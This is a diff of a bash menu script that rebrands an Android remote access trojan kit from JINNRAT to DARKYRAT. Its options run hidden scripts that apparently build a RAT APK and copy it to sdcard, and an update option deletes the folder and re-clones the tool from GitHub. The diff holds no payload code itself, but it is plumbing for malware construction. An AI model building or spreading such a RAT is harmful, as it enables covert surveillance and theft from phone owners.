@@ -34,26 +34,26 @@ echo -e "     $Purple==>$Yellow[6] exit $Green            "
 echo " "
 echo " "
 
-    read -p ${Y}"JINNRAT: "${W} ch
+    read -p ${Y}"DARKYRAT: "${W} ch
 echo
 
    if [ $ch -eq 1 ];then
         cd $HOME
-        cd JINNRAT
+        cd DARKYRAT
         cd .RAT
         bash .JINN
 
         exit
     elif [ $ch -eq 2 ];then
         cd $HOME
-        cd JINNRAT
+        cd DARKYRAT
         cd .RAT
         bash .BuildAPK
 
         exit
     elif [ $ch -eq 3 ];then
         cd $HOME
-        cd JINNRAT
+        cd DARKYRAT
         cd .RAT
         bash .setup
 
@@ -61,7 +61,7 @@ echo
     elif [ $ch -eq 4 ];then
         echo -e "\e[1;31m 😈 Apk copy sdcard Please check...📌"
         cd $HOME
-        cd JINNRAT
+        cd DARKYRAT
         cd .RAT
         bash .sdapk
 
@@ -69,7 +69,7 @@ echo
     elif [ $ch -eq 5 ];then
         echo -e "\e[1;34m Downloading Latest Files..."
         cd $HOME
-        rm -rf JINNRAT
+        rm -rf DARKYRAT
         git clone https://github.com/alvinbaby/JINNRAT
         cd JINNRAT
         chmod +x *
